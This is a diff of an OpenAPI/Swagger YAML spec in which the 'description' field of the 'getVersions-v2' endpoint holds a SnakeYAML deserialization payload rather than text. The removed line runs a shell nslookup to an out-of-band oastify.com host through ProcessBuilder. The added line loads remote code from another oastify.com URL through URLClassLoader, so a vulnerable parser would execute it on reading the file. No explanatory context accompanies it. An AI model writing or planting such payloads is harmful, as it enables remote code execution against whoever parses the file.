@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.lang.ProcessBuilder [[!!java.lang.command ["sh -c nslookup gyikx0kr82h6czz32vjpmx0q4ha9y6mv.oastify.com"]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [https://07546ktbhmqqlj8nbfs9vh9ad1js7j47t.oastify.com]]]]
       produces:
       - application/json
       responses:
